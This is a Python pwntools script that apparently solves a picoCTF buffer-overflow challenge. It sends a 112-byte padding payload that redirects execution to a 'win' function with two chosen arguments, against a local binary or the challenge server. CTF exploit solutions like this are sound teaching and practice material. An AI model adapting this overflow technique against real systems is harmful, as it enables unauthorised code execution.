#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 65441)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *vuln+57
        b *win+118
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

win_func_addr = elf.symbols['win']
arg1 = 0xcafef00d
arg2 = 0xf00df00d

payload = b""
payload += b"A" * 112
payload += p32(win_func_addr+0x5)
payload += p32(0xdead) * 2
payload += p32(arg1)
payload += p32(arg2)

p.recvuntil("")
sleep(0.5)
p.sendline(payload)

p.interactive()
